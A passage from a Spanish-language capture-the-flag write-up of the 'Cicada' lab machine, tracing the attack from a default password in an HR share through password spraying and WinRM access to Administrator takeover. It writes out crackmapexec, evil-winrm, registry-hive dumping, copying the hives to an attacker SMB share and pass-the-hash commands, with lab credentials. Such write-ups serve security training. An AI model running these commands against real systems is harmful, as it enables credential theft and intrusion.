+</code></pre></div>
+<p>Como se puede observar para DEV no tenemos permiso para ingresar, pero para HR, encontramos un archivo <code>Notice from HR.txt</code></p>
+<p><img alt="img" src="../img/cicada/img5.png" /></p>
+<p>Descargamos el archivo <code>Notice from HR.txt</code> y observamos su contenido.</p>
+<p><img alt="img" src="../img/cicada/img6.png" /></p>
+<p>El contenido del archivo contiene la siguiente información:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>Dear<span class="w"> </span>new<span class="w"> </span>hire!
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>Welcome<span class="w"> </span>to<span class="w"> </span>Cicada<span class="w"> </span>Corp!<span class="w"> </span>We<span class="s1">&#39;re thrilled to have you join our team. As part of our security protocols, it&#39;</span>s<span class="w"> </span>essential<span class="w"> </span>that<span class="w"> </span>you<span class="w"> </span>change<span class="w"> </span>your<span class="w"> </span>default<span class="w"> </span>password<span class="w"> </span>to<span class="w"> </span>something<span class="w"> </span>unique<span class="w"> </span>and<span class="w"> </span>secure.
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>Your<span class="w"> </span>default<span class="w"> </span>password<span class="w"> </span>is:<span class="w"> </span>Cicada<span class="nv">$M6Corpb</span>*@Lp#nZp!8
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>To<span class="w"> </span>change<span class="w"> </span>your<span class="w"> </span>password:
+<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>
+<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a><span class="m">1</span>.<span class="w"> </span>Log<span class="w"> </span><span class="k">in</span><span class="w"> </span>to<span class="w"> </span>your<span class="w"> </span>Cicada<span class="w"> </span>Corp<span class="w"> </span>account**<span class="w"> </span>using<span class="w"> </span>the<span class="w"> </span>provided<span class="w"> </span>username<span class="w"> </span>and<span class="w"> </span>the<span class="w"> </span>default<span class="w"> </span>password<span class="w"> </span>mentioned<span class="w"> </span>above.
+<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a><span class="m">2</span>.<span class="w"> </span>Once<span class="w"> </span>logged<span class="w"> </span><span class="k">in</span>,<span class="w"> </span>navigate<span class="w"> </span>to<span class="w"> </span>your<span class="w"> </span>account<span class="w"> </span>settings<span class="w"> </span>or<span class="w"> </span>profile<span class="w"> </span>settings<span class="w"> </span>section.
+<a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a><span class="m">3</span>.<span class="w"> </span>Look<span class="w"> </span><span class="k">for</span><span class="w"> </span>the<span class="w"> </span>option<span class="w"> </span>to<span class="w"> </span>change<span class="w"> </span>your<span class="w"> </span>password.<span class="w"> </span>This<span class="w"> </span>will<span class="w"> </span>be<span class="w"> </span>labeled<span class="w"> </span>as<span class="w"> </span><span class="s2">&quot;Change Password&quot;</span>.
+<a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a><span class="m">4</span>.<span class="w"> </span>Follow<span class="w"> </span>the<span class="w"> </span>prompts<span class="w"> </span>to<span class="w"> </span>create<span class="w"> </span>a<span class="w"> </span>new<span class="w"> </span>password**.<span class="w"> </span>Make<span class="w"> </span>sure<span class="w"> </span>your<span class="w"> </span>new<span class="w"> </span>password<span class="w"> </span>is<span class="w"> </span>strong,<span class="w"> </span>containing<span class="w"> </span>a<span class="w"> </span>mix<span class="w"> </span>of<span class="w"> </span>uppercase<span class="w"> </span>letters,<span class="w"> </span>lowercase<span class="w"> </span>letters,<span class="w"> </span>numbers,<span class="w"> </span>and<span class="w"> </span>special<span class="w"> </span>characters.
+<a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a><span class="m">5</span>.<span class="w"> </span>After<span class="w"> </span>changing<span class="w"> </span>your<span class="w"> </span>password,<span class="w"> </span>make<span class="w"> </span>sure<span class="w"> </span>to<span class="w"> </span>save<span class="w"> </span>your<span class="w"> </span>changes.
+<a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a>
+<a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a>Remember,<span class="w"> </span>your<span class="w"> </span>password<span class="w"> </span>is<span class="w"> </span>a<span class="w"> </span>crucial<span class="w"> </span>aspect<span class="w"> </span>of<span class="w"> </span>keeping<span class="w"> </span>your<span class="w"> </span>account<span class="w"> </span>secure.<span class="w"> </span>Please<span class="w"> </span><span class="k">do</span><span class="w"> </span>not<span class="w"> </span>share<span class="w"> </span>your<span class="w"> </span>password<span class="w"> </span>with<span class="w"> </span>anyone,<span class="w"> </span>and<span class="w"> </span>ensure<span class="w"> </span>you<span class="w"> </span>use<span class="w"> </span>a<span class="w"> </span>complex<span class="w"> </span>password.
+<a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a>
+<a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a>If<span class="w"> </span>you<span class="w"> </span>encounter<span class="w"> </span>any<span class="w"> </span>issues<span class="w"> </span>or<span class="w"> </span>need<span class="w"> </span>assistance<span class="w"> </span>with<span class="w"> </span>changing<span class="w"> </span>your<span class="w"> </span>password,<span class="w"> </span>don<span class="err">&#39;</span>t<span class="w"> </span>hesitate<span class="w"> </span>to<span class="w"> </span>reach<span class="w"> </span>out<span class="w"> </span>to<span class="w"> </span>our<span class="w"> </span>support<span class="w"> </span>team<span class="w"> </span>at<span class="w"> </span>support@cicada.htb.
+<a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a>
+<a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a>Thank<span class="w"> </span>you<span class="w"> </span><span class="k">for</span><span class="w"> </span>your<span class="w"> </span>attention<span class="w"> </span>to<span class="w"> </span>this<span class="w"> </span>matter,<span class="w"> </span>and<span class="w"> </span>once<span class="w"> </span>again,<span class="w"> </span>welcome<span class="w"> </span>to<span class="w"> </span>the<span class="w"> </span>Cicada<span class="w"> </span>Corp<span class="w"> </span>team!
+<a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a>
+<a id="__codelineno-12-21" name="__codelineno-12-21" href="#__codelineno-12-21"></a>Best<span class="w"> </span>regards,
+<a id="__codelineno-12-22" name="__codelineno-12-22" href="#__codelineno-12-22"></a>Cicada<span class="w"> </span>Corp
+</code></pre></div>
+<p>Se identificó una credencial por defecto (Cicada$M6Corpb*@Lp#nZp!8), la cual podría ser utilizada para acceder a algún recurso del sistema.</p>
+<p>Seguimos con la realización de encontrar mas información por parte del usuario <code>guest</code>, con lo que se procede a realizar un análisis con fuerza bruta para observar que se encuentra.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">crackmapexec</span><span class="w"> </span><span class="n">smb</span><span class="w"> </span><span class="n">cicada</span><span class="o">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s2">&quot;guest&quot;</span><span class="w"> </span><span class="o">-</span><span class="nb">p</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="o">--</span><span class="n">rid</span><span class="o">-</span><span class="n">brute</span>
+</code></pre></div>
+<p>Se encuentra varias información y varios posibles usuarios, se agregan a una lista de usuario para poder seguir analizando y poder tener acceso al sistema.</p>
+<p><img alt="img" src="../img/cicada/img7.png" /></p>
+<p>Realizamos un filtro para obtener los usuarios que podemos utilizar en esta lista y luego realizar un ataque de fuerza bruta con estos usuarios, para mirar si se logra obtener acceso con alguno.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="n">crackmapexec</span><span class="w"> </span><span class="n">smb</span><span class="w"> </span><span class="n">cicada</span><span class="o">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s2">&quot;guest&quot;</span><span class="w"> </span><span class="o">-</span><span class="nb">p</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span><span class="o">--</span><span class="n">rid</span><span class="o">-</span><span class="n">brute</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="s2">&quot;SidTypeUser&quot;</span>
+</code></pre></div>
+<p><img alt="img" src="../img/cicada/img8.png" /></p>
+<p>Se crea un listado de los posibles usuarios.</p>
+<p><img alt="img" src="../img/cicada/img9.png" /></p>
+<p>Se procederá a realizar una enumeración con los usuarios identificados, con el objetivo de obtener información adicional o identificar un usuario válido para el sondeo, utilizando la credencial por defecto encontrada.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="n">nxc</span><span class="w"> </span><span class="n">smb</span><span class="w"> </span><span class="n">cicada</span><span class="o">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="o">-</span><span class="nb">p</span><span class="w"> </span><span class="s1">&#39;Cicada$M6Corpb*@Lp#nZp!8&#39;</span>
+</code></pre></div>
+<p>Al realizar el escaneo encontramos que el único usuario que se logra tener un acceso por SMB es <code>michael.wrightson</code></p>
+<p><img alt="img" src="../img/cicada/img10.png" /></p>
+<p>Realizamos una enumeración con la herramienta <code>enum4linux-ng</code> para este equipo de Windows sobre el servicio de SMB,  y poder encontrar algo mas de información sobre el sistema.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="n">enum4linux</span><span class="o">-</span><span class="n">ng</span><span class="w"> </span><span class="o">-</span><span class="n">A</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s1">&#39;Michael.wrightson&#39;</span><span class="w"> </span><span class="o">-</span><span class="nb">p</span><span class="w"> </span><span class="s1">&#39;Cicada$M6Corpb*@Lp#nZp!8&#39;</span><span class="w"> </span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">11</span><span class="o">.</span><span class="mi">35</span>
+</code></pre></div>
+<p>Se encuentra un usuario  mas en esta enumeración, usuario <code>david.orelious</code> y su password <code>aRt$Lp#7t*VQ!3</code>, con el que procedemos a averiguar en algún servicio de SMB si podemos escalar mas privilegios.</p>
+<p><img alt="img" src="../img/cicada/img11.png" /></p>
+<p>Con la herramienta de <code>smbclient</code> seguimos explorando si logramos acceder algún recurso compartido de DEV, que antes no logramos tener acceso.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="n">smbclient</span><span class="w"> </span><span class="sr">//</span><span class="n">cicada</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="no">DEV</span><span class="w"> </span><span class="o">-</span><span class="n">U</span><span class="w"> </span><span class="n">david</span><span class="o">.</span><span class="n">orelious</span><span class="sx">%&#39;aRt$Lp#7t*VQ!3&#39;</span>
+</code></pre></div>
+<p>Se logra ingresar a los archivos compartidos para el usuario y se encuentra un archivo <code>Backup_script.ps1</code> que se procede a descargar a la maquina host y proceder a analizar que contiene.</p>
+<p><img alt="img" src="../img/cicada/img12.png" /></p>
+<p>En este archivo se logra obtener otro usuario que contiene también una credencial.</p>
+<p><img alt="img" src="../img/cicada/img13.png" /></p>
+<p>Ahora con esta nueva contraseña ingresada en nuestro diccionario de password, realizamos otra vez el comando <code>crackmapexec</code>.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="n">crackmapexec</span><span class="w"> </span><span class="n">smb</span><span class="w"> </span><span class="n">cicada</span><span class="o">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="o">-</span><span class="nb">p</span><span class="w"> </span><span class="n">pass</span><span class="w"> </span><span class="o">--</span><span class="n">continue</span><span class="o">-</span><span class="n">on</span><span class="o">-</span><span class="n">success</span>
+</code></pre></div>
+<p>Se puede observar que efectivamente este usuario y contraseña son validos para <code>smb</code>.</p>
+<p><img alt="img" src="../img/cicada/img14.png" /></p>
+<p>Ahora vamos a probar otro protocolo para ver si tenemos algún acceso con estos usuario y contraseñas que se encontraron.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="n">crackmapexec</span><span class="w"> </span><span class="n">winrm</span><span class="w"> </span><span class="n">cicada</span><span class="o">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="o">-</span><span class="nb">p</span><span class="w"> </span><span class="n">pass</span><span class="w"> </span><span class="o">--</span><span class="n">continue</span><span class="o">-</span><span class="n">on</span><span class="o">-</span><span class="n">success</span>
+</code></pre></div>
+<p>Se logra observar que con el servicio de <code>winrm</code>, logramos tener un acceso al sistemas, con el usuario <code>emily.oscars</code> y password <code>Q!3@Lp#M6b*7t*Vt</code></p>
+<p><img alt="img" src="../img/cicada/img15.png" /></p>
+<p>Ahora nos conectamos al sistema para poder ingresar al sistema con la herramienta de <code>evil-winrm</code></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="n">evil</span><span class="o">-</span><span class="n">winrm</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="n">cicada</span><span class="o">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s1">&#39;emily.oscars&#39;</span><span class="w"> </span><span class="o">-</span><span class="nb">p</span><span class="w"> </span><span class="s1">&#39;Q!3@Lp#M6b*7t*Vt&#39;</span>
+</code></pre></div>
+<p>Se ha logrado acceder a la maquina con el usuario de <code>emily.oscars</code>.</p>
+<p><img alt="img" src="../img/cicada/img16.png" /></p>
+<p>Obtenemos la <strong>flag</strong> del usuario respectivo.</p>
+<p><img alt="img" src="../img/cicada/img17.png" /></p>
+<p>Se lista los diferentes grupos y permisos que tiene el usuario sobre el sistemas, y los cuales nos van a servir para realizar la escalar privilegios.</p>
+<p><img alt="img" src="../img/cicada/img18.png" /></p>
+<p><img alt="img" src="../img/cicada/img19.png" /></p>
+<h2 id="escalamiento-de-privilegios">Escalamiento de privilegios</h2>
+<p>Vamos a escalar privilegios, gracias a este servicio <code>SeBackupPrivilege</code>,  y vamos a revisar la información del siguiente articulo para poder escalar privilegios <a href="https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/">hackingarticles</a>se utiliza los siguiente comandos para poder sacar el <code>sam</code> del sistema y el <code>system</code>.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>reg<span class="w"> </span>save<span class="w"> </span>hklm<span class="se">\s</span>am<span class="w"> </span>samR
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>reg<span class="w"> </span>save<span class="w"> </span>hklm<span class="se">\s</span>ystem<span class="w"> </span>systemR
+</code></pre></div>
+<p>Después de ejecutar estos los comandos me quedan dos archivos donde contengo la información del sistema.</p>
+<p><img alt="img" src="../img/cicada/img20.png" /></p>
+<p>Ahora se procede a pasar los archivos generados a la maquina host para proceder a analizar la información de cada archivo.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="n">sudo</span><span class="w"> </span><span class="n">impacket</span><span class="o">-</span><span class="n">smbserver</span><span class="w"> </span><span class="no">KzFFile</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="o">-</span><span class="n">smb2support</span>
+</code></pre></div>
+<p>Se enviar los archivo <code>samR</code> y <code>systemR</code> desde Windows a la maquina host.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="n">copy</span><span class="w"> </span><span class="n">samR</span><span class="w"> </span><span class="p">\\</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">14</span><span class="o">.</span><span class="mi">100</span><span class="p">\</span><span class="no">KzFFile</span><span class="p">\</span><span class="n">samR</span>
+<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="n">copy</span><span class="w"> </span><span class="n">systemR</span><span class="w"> </span><span class="p">\\</span><span class="mi">10</span><span class="o">.</span><span class="mi">10</span><span class="o">.</span><span class="mi">14</span><span class="o">.</span><span class="mi">100</span><span class="p">\</span><span class="no">KzFFile</span><span class="p">\</span><span class="n">systemR</span>
+</code></pre></div>
+<p>Se realiza la explotación con <code>impacket</code> para ver lo archivos que fueron copiados y revisar que contienen, pero va hacer en LOCAL.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="n">impacket</span><span class="o">-</span><span class="n">secretsdump</span><span class="w"> </span><span class="o">-</span><span class="n">sam</span><span class="w"> </span><span class="n">samR</span><span class="w"> </span><span class="o">-</span><span class="nb">system</span><span class="w"> </span><span class="n">systemR</span><span class="w"> </span><span class="no">LOCAL</span>
+</code></pre></div>
+<p>Con esa información miramos que obtenemos los hash NTLM, pero lo interesante es que obtenemos el Hash NTLM del usuario <code>Administrator</code>.</p>
+<p><img alt="img" src="../img/cicada/img21.png" /></p>
+<p>Ahora con el hash NTLM y utilizando <code>evil-winrm</code> con la parte del hash LM la usamos para conectarnos a la cuenta del usuario <code>Administrator</code>.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="n">evil</span><span class="o">-</span><span class="n">winrm</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="n">cicada</span><span class="o">.</span><span class="n">htb</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s1">&#39;Administrator&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="s1">&#39;2b87e7c93a3e8a0ea4a581937016f341&#39;</span>
+</code></pre></div>
+<p>Se ha logrado acceder a la maquina con el usuario <code>Administrator</code>, obteniendo los altos privilegios sobre la maquina, utilizando la técnica de <code>pass-the-hash</code>.</p>
+<p><img alt="img" src="../img/cicada/img22.png" /></p>
+<p>La <strong>flag</strong> al finalizar la escalación de privilegios.</p>
+<p><img alt="img" src="../img/cicada/img23.png" /></p>
+<p><strong>Finalización de la maquina Cicada por <code>KrozFu</code></strong></p>
+<p><img alt="img" src="../img/cicada/img24.png" /></p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      &copy; 2025 <a href="https://github.com/krozfu"  target="_blank" rel="noopener">KrozFu</a>
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://www.linkedin.com/in/juan-carlos-charfuelan-caipe" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5m282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/krozfu" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 480 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1M480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2m-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3m-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://www.youtube.com/@krozfuhack" target="_blank" rel="noopener" title="www.youtube.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M549.655 124.083c-6.281-23.65-24.787-42.276-48.284-48.597C458.781 64 288 64 288 64S117.22 64 74.629 75.486c-23.497 6.322-42.003 24.947-48.284 48.597-11.412 42.867-11.412 132.305-11.412 132.305s0 89.438 11.412 132.305c6.281 23.65 24.787 41.5 48.284 47.821C117.22 448 288 448 288 448s170.78 0 213.371-11.486c23.497-6.321 42.003-24.171 48.284-47.821 11.412-42.867 11.412-132.305 11.412-132.305s0-89.438-11.412-132.305m-317.51 213.508V175.185l142.739 81.205z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://twitter.com/krozfu" target="_blank" rel="noopener" title="twitter.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://www.instagram.com/krozfu/" target="_blank" rel="noopener" title="www.instagram.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.7.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141m0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7m146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8m76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8M398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../../../..", "features": ["navigation.tabs", "navigation.sections", "toc.integrate", "navigation.top", "search.suggest", "search.highlight", "content.tabs.link", "content.code.annotation", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.13a4f30d.min.js"></script>
+      
+    
+  </body>
+</html>
